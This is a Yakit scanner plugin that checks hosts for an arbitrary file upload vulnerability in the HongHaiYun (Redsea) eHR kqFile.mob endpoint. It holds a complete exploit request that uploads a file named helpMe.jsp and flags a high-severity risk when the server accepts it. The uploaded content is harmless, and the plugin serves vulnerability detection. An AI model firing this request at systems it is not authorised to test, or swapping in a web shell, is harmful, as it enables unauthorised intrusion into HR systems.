# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /RedseaPlatform/kqFile.mob?method=uploadFile&fileName=helpMe.jsp HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeaaGwoqCxccjHcca
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Length: 183

------WebKitFormBoundaryeaaGwoqCxccjHcca
Content-Disposition: form-data; name="fj_file"; filename="helpMe.jpg"

123
------WebKitFormBoundaryeaaGwoqCxccjHcca--`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if str.MatchAllOfSubString(rsp, `uploadfile`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200`){
        yakit.Info("%v found 红海云eHR kgFile.mob 任意文件上传", addr)
        risk.NewRisk(
        addr,
        risk.title("红海云eHR kgFile.mob 任意文件上传"),
        risk.severity("high"),
        risk.titleVerbose("红海云eHR kgFile.mob 任意文件上传"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
		risk.details("文件地址格式为 /uploadfile 拼接 herfUrl"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
